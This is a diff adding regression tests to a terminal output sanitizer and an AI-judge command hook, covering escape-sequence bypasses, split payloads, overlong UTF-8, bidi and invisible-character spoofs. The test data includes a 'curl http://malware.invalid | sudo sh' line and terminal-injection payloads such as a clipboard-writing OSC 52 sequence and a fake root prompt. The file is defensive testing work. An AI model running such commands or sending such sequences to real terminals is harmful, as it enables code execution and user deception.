@@ -1082,12 +1082,12 @@ if os.path.exists(_ex):
        'example hook blocks curl | sudo sh')
 # the AI-judge example handler: fast-path, escalation, AI verdict, fail-open
 import json as _json                               # noqa: E402
-_aij = os.path.join(_usr, "share", "secure-terminal", "hooks", "ai-judge-hook")
+_aij = os.path.join(_usr, 'share', 'secure-terminal', 'hooks', 'ai-judge-hook')
 if os.path.exists(_aij):
-    _maifd, _mockai = tempfile.mkstemp(prefix="mock-ai-")
+    _maifd, _mockai = tempfile.mkstemp(prefix='mock-ai-')
     os.close(_maifd)
-    with open(_mockai, "w", encoding="utf-8") as _mh:
-        _mh.write("#!/usr/bin/python3\nimport sys\np = sys.stdin.read()\n"
+    with open(_mockai, 'w', encoding='utf-8') as _mh:
+        _mh.write('#!/usr/bin/python3\nimport sys\np = sys.stdin.read()\n'
                   'print("{\\"verdict\\": \\"block\\"}" if "sudo sh" in p '
                   'else "{\\"verdict\\": \\"allow\\"}")\n')
     os.chmod(_mockai, 0o700)
@@ -1095,21 +1095,21 @@ if os.path.exists(_aij):
     def _run_aij(req, ai=None):
         env = dict(os.environ, SECURE_TERMINAL_AI=ai or _mockai)
         proc = subprocess.run([sys.executable, _aij], env=env,
-                              input=_json.dumps(req).encode("utf-8"),
+                              input=_json.dumps(req).encode('utf-8'),
                               stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                               timeout=30)
-        return _json.loads(proc.stdout.decode("utf-8", "replace"))
+        return _json.loads(proc.stdout.decode('utf-8', 'replace'))
 
-    eq(_run_aij({"command": "ls -la"})["verdict"], "allow",
-       "ai-judge allows a trivial command without calling the AI")
-    eq(_run_aij({"command": "cp $SRC dest"})["verdict"], "need_transcript",
-       "ai-judge escalates a contextual command")
-    eq(_run_aij({"command": "curl http://malware.invalid | sudo sh",
-                 "transcript": "x"})["verdict"], "block",
-       "ai-judge blocks via the AI verdict")
-    eq(_run_aij({"command": "gpg x", "transcript": "y"},
-                ai="/nonexistent-ai-xyz")["verdict"], "allow",
-       "ai-judge fails open when the AI is unavailable")
+    eq(_run_aij({'command': 'ls -la'})['verdict'], 'allow',
+       'ai-judge allows a trivial command without calling the AI')
+    eq(_run_aij({'command': 'cp $SRC dest'})['verdict'], 'need_transcript',
+       'ai-judge escalates a contextual command')
+    eq(_run_aij({'command': 'curl http://malware.invalid | sudo sh',
+                 'transcript': 'x'})['verdict'], 'block',
+       'ai-judge blocks via the AI verdict')
+    eq(_run_aij({'command': 'gpg x', 'transcript': 'y'},
+                ai='/nonexistent-ai-xyz')['verdict'], 'allow',
+       'ai-judge fails open when the AI is unavailable')
     os.remove(_mockai)
 
 # --- line_edits=False makes escape-driven editing append-only -----------------
@@ -1299,6 +1299,419 @@ eq((comp, cur), ([], 'safepwn!'),
 # and no escape byte ever survives into a cell
 _, cur, _, _ = _line('a\x1b[31m\x1b]0;t\x07b\x1bZ', 'box')
 ok('\x1b' not in cur, 'no ESC byte survives feed_line_edits')
+
+# ==============================================================================
+# BYPASSES -- a control routed AROUND rather than broken head-on.
+# ==============================================================================
+
+def _cells_render(raw, mode='detail', line_edits=True, max_line=0):
+    """Render `raw` the way the WIDGET does: through the cell model, then through
+    cells_to_runs. Distinct from render_output(), which the CLI wrapper uses -- a
+    leak can exist in one path and not the other, so tests must drive this one."""
+    comp, cells, _col, _sgr, wraps = S.feed_line_edits(
+        [], 0, {}, raw, max_line, line_edits)
+    runs, _prefix = S.cells_to_runs(comp, cells, mode, False, wraps=wraps)
+    return ''.join(text for text, _key in runs)
+
+
+# --- BYPASS: the ECMA-48 escape grammar, not just the arms we remembered -------
+# An escape is ESC + intermediate bytes (0x20-0x2F) + a final byte (0x30-0x7E).
+# A sequence the stripper does not MATCH is not neutralized -- the lone ESC is
+# merely dropped and the REST renders as ordinary text, unmarked. That routes
+# around the marking guard instead of defeating it: the charset designators
+# (ESC ( B, which every terminfo `sgr0` emits, and ESC ( 0 for line drawing) used
+# to print "(B" / "(0", and ESC c / ESC 7 / ESC # 8 printed their final byte.
+# Sweep the WHOLE grammar, both render paths, so a future narrowing cannot
+# reintroduce a hole one hand-picked case would miss.
+# these open a LONGER form (CSI/OSC/DCS/SOS/PM/APC, and the SS2/SS3 single
+# shifts, which take one graphic byte), so they are not two-byte escapes
+_INTRODUCERS = '[]PX^_NO'
+_ESC_LEAK = []
+for _f in range(0x30, 0x7F):
+    if chr(_f) in _INTRODUCERS:
+        continue
+    _seq = '\x1b' + chr(_f)
+    if _cells_render('A' + _seq + 'B') != 'AB' or \
+            S.render_output('A' + _seq + 'B', 'detail') != 'AB':
+        _ESC_LEAK.append(_seq)
+eq(_ESC_LEAK, [], 'every two-byte escape ESC+final is consumed whole, no leak')
+
+_ESC_LEAK = []
+for _i in ' !"#$%&\'()*+,-./':                    # every intermediate byte
+    for _f in range(0x30, 0x7F):
+        _seq = '\x1b' + _i + chr(_f)
+        if _cells_render('A' + _seq + 'B') != 'AB' or \
+                S.render_output('A' + _seq + 'B', 'detail') != 'AB':
+            _ESC_LEAK.append(_seq)
+eq(_ESC_LEAK, [],
+   'every ESC+intermediate+final escape (charset designators, DECALN) is consumed')
+
+# The named real-world offenders, spelled out so a failure names the attack.
+eq(_cells_render('A\x1b(0B'), 'AB', 'ESC ( 0 (line-drawing charset) leaks no "(0"')
+eq(_cells_render('A\x1b(B\x1b[mB'), 'AB', 'terminfo sgr0 (ESC ( B ESC [ m) leaks no "(B"')
+eq(_cells_render('A\x1bcB'), 'AB', 'RIS (ESC c) leaks no "c"')
+eq(_cells_render('A\x1b7B\x1b8C'), 'ABC', 'DECSC/DECRC (ESC 7 / ESC 8) leak no digit')
+eq(_cells_render('A\x1b#8B'), 'AB', 'DECALN (ESC # 8) leaks no "#8"')
+
+# SS2 / SS3 take the ONE graphic byte after them, so they are three bytes: a
+# two-byte-only strip leaves that byte on screen. Sweep the whole graphic range.
+_ESC_LEAK = []
+for _shift in 'NO':
+    for _g in range(0x20, 0x7F):
+        _seq = '\x1b' + _shift + chr(_g)
+        if _cells_render('A' + _seq + 'B') != 'AB' or \
+                S.render_output('A' + _seq + 'B', 'detail') != 'AB':
+            _ESC_LEAK.append(_seq)
+eq(_ESC_LEAK, [], 'SS2/SS3 (ESC N / ESC O) consume their shifted byte, no leak')
+
+# ...and the stripper must not become GREEDY: a byte that cannot be an escape
+# final (a control byte) is not part of the sequence and must survive. The BEL
+# case is the sharp one -- 0x07 sits just below the 0x30 final-byte floor, so a
+# wider class would eat it and silence the bell instead of ringing it.
+_comp, _cur, _, _ = _line('A\x1b\nB')
+eq((_comp, _cur), (['A'], 'B'), 'ESC before a newline does not swallow the newline')
+eq(_cells_render('A\x1b\x07B'), 'AB', 'ESC before a BEL does not swallow the BEL handling')
+ok(S.has_bell('\x1b\x07'), 'a BEL after a bare ESC is still a bell, not an escape final')
+# RIS is consumed for DISPLAY yet must still be SEEN by the clear-screen notice:
+# stripping and detection read the same bytes and must not disagree.
+eq(_cells_render('A\x1bcB'), 'AB', 'RIS renders nothing')
+ok(S.wants_clear('\x1bc'), 'RIS is still detected as a screen clear')
+# a malformed CSI introducer followed by a real sequence: the dead introducer is
+# consumed, and the sequence after it is still handled normally
+eq(_cells_render('\x1b[' + '\x1b[31mx\x1b[0m'), 'x',
+   'a dangling CSI introducer is consumed without eating the next sequence')
+
+# --- BYPASS: a payload split so no single read contains the pattern ------------
+# The renderer is stateless per chunk; the escape carry is what makes it whole.
+# Split every hostile sequence at EVERY byte boundary and drive it the way the
+# widget does (feed_chunk_carry, then the cell model with persisted state): the
+# result must equal the unsplit render. A split that leaks is invisible to any
+# test that only ever feeds a whole sequence.
+_SPLIT_PAYLOADS = (
+    '\x1b[2J', '\x1b[?1049h', '\x1b]0;pwned\x07', '\x1b]52;c;cGF5\x07',
+    '\x1b]8;;http://evil\x1b\\link\x1b]8;;\x1b\\', '\x1bP+q544e\x1b\\',
+    '\x1b_Gf=100;payload\x1b\\', '\x1b(0', '\x1bc', '\x1b#8', '\x1b[>4;2m',
+    '\x1b[6n', '\x1b[c', '\x1b^msg\x1b\\', '\x1bX sos \x1b\\',
+)
+_SPLIT_BAD = []
+for _p in _SPLIT_PAYLOADS:
+    _raw = 'A' + _p + 'B'
+    _want = _cells_render(_raw)
+    for _cut in range(1, len(_raw)):
+        _carry, _drop, _cells, _col, _sgr = '', '', [], 0, {}
+        _acc_comp, _acc_wraps = [], []
+        for _chunk in (_raw[:_cut], _raw[_cut:]):
+            _text, _carry, _drop = S.feed_chunk_carry(_chunk, _carry, _drop)
+            _c, _cells, _col, _sgr, _w = S.feed_line_edits(
+                _cells, _col, _sgr, _text)
+            _acc_comp.extend(_c)
+            _acc_wraps.extend(_w)
+        _runs, _ = S.cells_to_runs(_acc_comp, _cells, 'detail', False,
+                                   wraps=_acc_wraps)
+        _got = ''.join(t for t, _k in _runs)
+        if _got != _want or _carry:
+            _SPLIT_BAD.append((_p, _cut, _got, _carry))
+eq(_SPLIT_BAD, [],
+   'a hostile sequence split at any byte renders like the unsplit one, carry drained')
+
+# Three-way split of the sequence that has both an introducer and a terminator:
+# the middle chunk contains NEITHER, so nothing but the carry can hold the state.
+_raw = 'A\x1b]0;pwned\x07B'
+_BAD3 = []
+for _i in range(1, len(_raw) - 1):
+    for _j in range(_i + 1, len(_raw)):
+        _carry, _drop, _cells, _col, _sgr = '', '', [], 0, {}
+        _acc = []
+        for _chunk in (_raw[:_i], _raw[_i:_j], _raw[_j:]):
+            _text, _carry, _drop = S.feed_chunk_carry(_chunk, _carry, _drop)
+            _c, _cells, _col, _sgr, _w = S.feed_line_edits(
+                _cells, _col, _sgr, _text)
+            _acc.extend(_c)
+        _runs, _ = S.cells_to_runs(_acc, _cells, 'detail', False)
+        if ''.join(t for t, _k in _runs) != 'AB' or _carry:
+            _BAD3.append((_i, _j))
+eq(_BAD3, [], 'an OSC split three ways (no chunk holds intro+terminator) still strips')
+
+# --- BYPASS: encoding tricks that reconstitute after the boundary --------------
+# The live stream uses an incremental UTF-8 decoder, so a multi-byte character
+# arrives in pieces. Two distinct hazards: (a) a dangerous character that
+# RECONSTITUTES across the split must still be neutralized -- the guard runs on
+# the decoded text, so a fragment that looked harmless must not stay harmless;
+# (b) an OVERLONG or surrogate encoding must never decode to its target at all.
+import codecs                                                        # noqa: E402
+import inspect                                                       # noqa: E402
+import secure_terminal.cli as _cli                                   # noqa: E402
+
+
+def _stream_render(chunks, mode='detail'):
+    """Decode byte chunks the way the widget does and render through the cells."""
+    dec = codecs.getincrementaldecoder('utf-8')('replace')
+    carry, drop, cells, col, sgr = '', '', [], 0, {}
+    comp = []
+    for i, blob in enumerate(chunks):
+        text = dec.decode(blob, i == len(chunks) - 1)
+        text, carry, drop = S.feed_chunk_carry(text, carry, drop)
+        c, cells, col, sgr, _w = S.feed_line_edits(cells, col, sgr, text)
+        comp.extend(c)
+    runs, _ = S.cells_to_runs(comp, cells, mode, False)
+    return ''.join(t for t, _k in runs)
+
+
+# The assertions below hold because the decoder REJECTS a malformed encoding
+# rather than repairing it. That is a product choice, not a law of Python, so pin
+# it: an error policy that passes bytes through ('surrogateescape') or preserves
+# lone surrogates ('surrogatepass') would reconstitute exactly what the sweep
+# below forbids, in both ingest paths.
+import secure_terminal.terminal as _tmod                            # noqa: E402
+for _mod in (_cli, _tmod):
+    _src = inspect.getsource(_mod)
+    ok("getincrementaldecoder('utf-8')('replace')" in _src,
+       '%s decodes the child stream with the strict replace policy'
+       % _mod.__name__)
+
+_RLO = chr(0x202E).encode('utf-8')                  # E2 80 AE, the bidi override
+for _cut in (1, 2):
+    _out = _stream_render([b'A' + _RLO[:_cut], _RLO[_cut:] + b'B'])
+    ok(chr(0x202E) not in _out,
+       'a bidi override split across reads is still neutralized (cut %d)' % _cut)
+    eq(_out, 'A<U+202E RIGHT-TO-LEFT OVERRIDE>B',
+       'the reconstituted override is MARKED, not silently dropped (cut %d)' % _cut)
+
+# Overlong encodings: the classic filter bypass (a shorter form is rejected, the
+# padded one is not). Python's decoder rejects them, so each byte becomes U+FFFD
+# -- assert the TARGET never appears, in any mode, so a future decoder swap that
+# accepts overlongs is caught here rather than in the field.
+_OVERLONG = (
+    (b'\xc0\xae', '.'), (b'\xe0\x80\xae', '.'), (b'\xf0\x80\x80\xae', '.'),
+    (b'\xc0\xaf', '/'), (b'\xc1\x9b', '\x1b'), (b'\xc0\x80', '\x00'),
+    (b'\xe0\x82\xae', chr(0x00AE)),
+)
+for _blob, _target in _OVERLONG:
+    for _mode in S.DISPLAY_MODES:
+        _out = _stream_render([b'A', _blob, b'B'], _mode)
+        ok(_target not in _out,
+           'overlong %r never decodes to %r (mode %s)' % (_blob, _target, _mode))
+
+# CESU-8 / surrogate-pair smuggling: an astral character encoded as two
+# UTF-8-encoded surrogates. It must not reassemble into the astral code point,
+# and no lone surrogate may reach the display.
+_CESU = b'\xed\xa0\xbd\xed\xb8\x80'              # U+1F600 as a surrogate pair
+_out = _stream_render([b'A', _CESU, b'B'])
+ok('\U0001f600' not in _out, 'CESU-8 surrogates do not reassemble into an astral char')
+ok(not any(0xD800 <= ord(c) <= 0xDFFF for c in _out), 'no lone surrogate is displayed')
+
+# A truncated multi-byte tail at end of stream must not hold a partial character
+# back forever, nor emit the raw bytes.
+_out = _stream_render([b'A' + _RLO[:2]])
+ok(chr(0x202E) not in _out and '\x1b' not in _out,
+   'a truncated multi-byte tail neither reconstitutes nor leaks raw bytes')
+
+# ==============================================================================
+# CLASHES -- two behaviours that are individually right and disagree together.
+# ==============================================================================
+
+# --- CLASH: the TUI cell sanitizer vs the CLI renderer ------------------------
+# Both implement the same policy over the same display modes, in different code
+# (tui_cell for the pyte grid, render_output for the line model). Where they
+# disagree, a payload is safe in one mode and unsafe in the other -- which is a
+# bypass by mode switch, not by defeating either guard. Sweep every code point
+# rather than a hand-picked list: the divergence that shipped (the
+# default-ignorable invisibles, e.g. "ad<U+3164>min" reading as "admin") was in
+# exactly the class a hand-picked list keeps forgetting.
+# 0x07-0x0D are excluded: render_output resolves them as bell/cursor controls,
+# while a TUI grid never stores one in a cell, so they diverge by design.
+# U+25A1 is excluded because it IS the placeholder: a neutralized cell and a
+# genuine box character produce the same output, so "kept" is unobservable there
+# by construction (the widget maps the box back to '_' on export for that reason).
+_STREAM_CONTROLS = frozenset((0x07, 0x08, 0x09, 0x0A, 0x0D, ord(S.BOX)))
+_SWEEP = ([c for c in range(0x00, 0x3000) if c not in _STREAM_CONTROLS]
+          + list(range(0xFE00, 0xFE10)) + list(range(0xFFA0, 0xFFA2))
+          + [0xE0100, 0xE01EF, 0x1D173, 0x1F600, 0x4E2D, 0x10FFFF])
+_DIVERGE = []
+_NOT_ONE_UNIT = []
+for _cp in _SWEEP:
+    _ch = chr(_cp)
+    for _mode in S.DISPLAY_MODES:
+        _t = S.tui_cell(_ch, _mode)
+        _keeps_tui = (_t == _ch)
+        if not _keeps_tui and _t != S.BOX:
+            _NOT_ONE_UNIT.append((_cp, _mode, _t))
+        if _mode in ('box', 'show'):
+            # same policy, two implementations: they must agree exactly
+            if _keeps_tui != (S.render_output(_ch, _mode) == _ch):
+                _DIVERGE.append((_cp, _mode))
+        elif _keeps_tui and not 0x20 <= _cp <= 0x7E:
+            # reveal/detail cannot fit a multi-column badge in a grid cell, so a
+            # TUI cell there may keep printable ASCII and nothing else
+            _DIVERGE.append((_cp, _mode))
+eq(_DIVERGE[:8], [],
+   'tui_cell and render_output neutralize the same code points in box/show')
+eq(_NOT_ONE_UNIT[:8], [],
+   'a neutralized TUI cell is always exactly the one-column box placeholder')
+
+# The concrete spoof the sweep generalizes, named so a failure is legible.
+for _inv in (0x3164, 0x115F, 0xFE0F, 0x034F, 0x180B, 0xE0100, 0x17B4, 0xFFA0):
+    eq(''.join(S.tui_cell(c, 'show') for c in 'ad' + chr(_inv) + 'min'),
+       'ad' + S.BOX + 'min',
+       'TUI show marks the invisible in "ad<U+%04X>min" (no fake "admin")' % _inv)
+
+# --- BYPASS: the combining-mark (Zalgo) cap must not be CLI-only --------------
+# feed_line_edits bounds a mark run at _COMBINING_RUN_MAX because the text engine
+# reshapes one huge grapheme cluster in O(n^2). pyte merges marks into the
+# PRECEDING cell's data, so a TUI cell arrives as one long string -- an uncapped
+# tui_cell lets the same flood through by the mode switch alone, with the DoS
+# intact. sanitize.py's own comment claims the cap covers both models, so this
+# also pins the comment to the code.
+_ZALGO = 'a' + chr(0x0301) * 20000
+_cmp, _cells, _col, _sgr, _w = S.feed_line_edits([], 0, {}, _ZALGO)
+ok(len(_cells) <= S._COMBINING_RUN_MAX + 1,
+   'the CLI cell model caps a combining-mark flood')
+ok(len(S.tui_cell(_ZALGO, 'show')) <= S._COMBINING_RUN_MAX + 1,
+   'the TUI cell caps the SAME flood (the cap is not CLI-only)')
+for _mode in S.DISPLAY_MODES:
+    ok(len(S.tui_cell(_ZALGO, _mode)) <= S._COMBINING_RUN_MAX + 1,
+       'the TUI combining cap holds in %s mode' % _mode)
+# a conformant cluster (well under the stream-safe limit) is untouched
+eq(S.tui_cell('e' + chr(0x0301), 'show'), 'e' + chr(0x0301),
+   'an ordinary decomposed grapheme survives the TUI cap intact')
+
+# --- BYPASS: the CLI wrapper must carry a split escape, like the widget --------
+# feed_chunk_carry documents itself as the CLI-mode incremental escape handler.
+# Rendering each os.read() chunk independently loses the introducer, so the
+# sequence's REMAINDER prints as text onto the real outer terminal -- carriage
+# return included, which repaints the current line into a fake prompt. No escape
+# byte survives, so an ESC-only assertion on the whole payload cannot see it.
+_WHOLE = '\x1b]0;\rroot@host:~# sudo -S \x07OK\n'
+_CHUNK_BAD = []
+for _cut in range(1, len(_WHOLE)):
+    _carry, _drop, _parts = '', '', []
+    for _chunk in (_WHOLE[:_cut], _WHOLE[_cut:]):
+        _text, _carry, _drop = S.feed_chunk_carry(_chunk, _carry, _drop)
+        _parts.append(S.render_output(_text, 'box'))
+    if ''.join(_parts) != S.render_output(_WHOLE, 'box') or _carry:
+        _CHUNK_BAD.append(_cut)
+eq(_CHUNK_BAD, [],
+   'chunked CLI rendering with the carry equals whole-text rendering at every cut')
+ok('root@host' not in ''.join(_parts),
+   'a split OSC never spills a fake prompt onto the outer terminal')
+# the wrapper actually WIRES the carry up -- importing it is not using it
+_cli_src = inspect.getsource(_cli)
+ok('feed_chunk_carry(' in _cli_src,
+   'the CLI wrapper calls feed_chunk_carry, not render_output alone')
+
+# --- CLASH: the paste review and the display marking must agree on the class ---
+# Two guards name the risk of the same character: classify_paste writes the
+# warning text ("2 bidirectional controls"), marking_class picks the on-screen
+# risk colour. When they disagree the user is told one thing and shown another --
+# and the understating one is the warning, which is the one they act on.
+# U+061C was bidi to the display and merely "invisible" to the paste review.
+_CLASS_MAP = {
+    'bidi': 'bidirectional control', 'control': 'control character',
+    'invisible': 'invisible character', 'confusable': 'non-ASCII character',
+    'nonascii': 'non-ASCII character',
+}
+_CLASS_BAD = []
+for _cp in (list(range(0x00, 0x3000)) + [0xFEFF, 0xFE0F, 0xFFA0, 0xE0100,
+                                         0x1F600, 0x4E2D, 0x10FFFF]):
+    if _cp in (0x09, 0x0A, 0x0D) or 0x20 <= _cp <= 0x7E:
+        continue                          # plain ASCII: neither guard reports it
+    _ch = chr(_cp)
+    _named = S.classify_paste(_ch)
+    _want = _CLASS_MAP[S.marking_class(_cp)]
+    if [(_want, 1)] != _named:
+        _CLASS_BAD.append((_cp, _named, _want))
+eq(_CLASS_BAD[:8], [],
+   'classify_paste and marking_class name the same risk class for every char')
+# the named regressions, spelled out
+eq(S.classify_paste(chr(0x061C)), [('bidirectional control', 1)],
+   'the Arabic letter mark is reported as a bidi control, not merely invisible')
+eq(S.marking_class(0x2062), 'invisible',
+   'an invisible math operator is coloured invisible, not plain non-ASCII')
+eq(S.marking_class(0x00AD), 'invisible', 'a soft hyphen is coloured invisible')
+eq(S.marking_class(0x3164), 'invisible', 'the Hangul filler is coloured invisible')
+eq(S.marking_class(0x0430), 'confusable',
+   'a homoglyph keeps its confusable class (the sweep must not flatten it)')
+
+# --- CLASH: overlapping escape handlers must claim the SAME bytes -------------
+# feed_line_edits dispatches a CSI to the line-edit handler when line_edits is on
+# and to the generic stripper when it is off. If the two matched DIFFERENT spans,
+# turning the setting off would leave a tail of the sequence on screen -- the
+# append-only promise broken by the very switch that is supposed to harden it.
+_SPAN_BAD = []
+for _op in 'CDGK':
+    for _param in ('', '0', '1', '2', '9', '99', '9' * 8, '9' * 5000):
+        _seq = '\x1b[' + _param + _op
+        _generic = S.ANSI_RE.match(_seq)
+        _lineop = S._LINE_CSI_RE.match(_seq)
+        if _generic is None or _lineop is None or _generic.end() != _lineop.end():
+            _SPAN_BAD.append(_seq[:16])
+for _param in ('', '0', '1;31', '38;5;196', '38;2;1;2;3'):
+    _seq = '\x1b[' + _param + 'm'
+    _generic = S.ANSI_RE.match(_seq)
+    _sgr = S._SGR_ONLY_RE.match(_seq)
+    if _generic is None or _sgr is None or _generic.end() != _sgr.end():
+        _SPAN_BAD.append(_seq)
+eq(_SPAN_BAD, [],
+   'the line-edit / SGR handlers and the generic stripper consume identical spans')
+
+# --- CLASH: the line_edits setting changed at RUNTIME, mid-stream -------------
+# The cell buffer PERSISTS across the flip, so the two settings meet on one line.
+# Turning the setting off must make the already-honoured ops inert without
+# corrupting the state they built, and without leaking the bytes it now ignores.
+_comp, _cells, _col, _sgr, _w = S.feed_line_edits([], 0, {}, 'hello\x1b[3G', 0, True)
+eq((''.join(c for c, _k in _cells), _col), ('hello', 2),
+   'line_edits on: CSI G moves the cursor')
+# flip OFF mid-line: the same op must now do nothing, and print nothing
+_c2, _cells2, _col2, _sgr2, _w2 = S.feed_line_edits(
+    _cells, _col, _sgr, '\x1b[1G\x1b[K\x1b[5C', 0, False)
+eq((''.join(c for c, _k in _cells2), _col2), ('hello', 2),
+   'line_edits off mid-stream: CSI G/K/C neither move, erase nor pad')
+eq(_cells_render('\x1b[1G\x1b[K\x1b[5C', 'detail', line_edits=False), '',
+   'line_edits off displays nothing for the ops it stopped honouring')
+# ...and flipping back ON restores them against the SAME buffer
+_c3, _cells3, _col3, _sgr3, _w3 = S.feed_line_edits(
+    _cells2, _col2, _sgr2, '\x1b[1GH', 0, True)
+eq(''.join(c for c, _k in _cells3), 'Hello',
+   'line_edits back on: the ops act again on the buffer built while off')
+# the cursor must stay inside the buffer across every flip (an out-of-range col
+# would index past the cells on the next write)
+ok(0 <= _col3 <= len(_cells3), 'the cursor stays within the cell buffer across flips')
+
+# A CSI split across the read that carries the flip: the head arrives under one
+# setting and the tail under the other. Neither half may reach the screen.
+for _cut in range(1, 5):
+    _seq = '\x1b[2K'
+    _carry, _drop = '', ''
+    _cells, _col, _sgr = [('x', ())], 1, {}
+    _text, _carry, _drop = S.feed_chunk_carry(_seq[:_cut], _carry, _drop)
+    _c, _cells, _col, _sgr, _w = S.feed_line_edits(
+        _cells, _col, _sgr, _text, 0, True)
+    _text, _carry, _drop = S.feed_chunk_carry(_seq[_cut:], _carry, _drop)
+    _c, _cells, _col, _sgr, _w = S.feed_line_edits(
+        _cells, _col, _sgr, _text, 0, False)
+    ok(all(c not in '\x1b[2K' or c == 'x' for c, _k in _cells),
+       'a CSI split across a line_edits flip leaks no byte (cut %d)' % _cut)
+    eq(_carry, '', 'the carry is drained after the split CSI completes (cut %d)' % _cut)
+
+# --- CLASH: display modes must neutralize the same SET of code points ---------
+# The modes differ in HOW they mark (box, glyph, badge), never in WHAT they let
+# through unmarked. A code point that is safe in one mode and dangerous in
+# another is a bypass reachable from the View menu.
+_MODE_BAD = []
+for _cp in list(range(0x00, 0x900)) + [0x200B, 0x200E, 0x202E, 0x2066, 0xFEFF,
+                                       0xFE0F, 0x3164, 0x115F, 0x034F, 0x2028]:
+    if _cp in _STREAM_CONTROLS or 0x20 <= _cp <= 0x7E:
+        continue
+    _ch = chr(_cp)
+    _passed = [m for m in S.DISPLAY_MODES if S.render_output(_ch, m) == _ch]
+    # 'show' is the ONE mode allowed to pass a printable non-ASCII glyph; nothing
+    # may pass in box/reveal/detail, and nothing invisible may pass anywhere.
+    if any(m != 'show' for m in _passed):
+        _MODE_BAD.append((_cp, _passed))
+    elif _passed and (not _ch.isprintable() or S.is_default_ignorable(_ch)):
+        _MODE_BAD.append((_cp, _passed))
+eq(_MODE_BAD[:8], [],
+   'only show passes a glyph, and no mode passes an invisible unmarked')
 
 # --- result -------------------------------------------------------------------
 sys.stdout.write('secure-terminal-tests: %d passed, %d failed\n' % (PASS, FAIL))
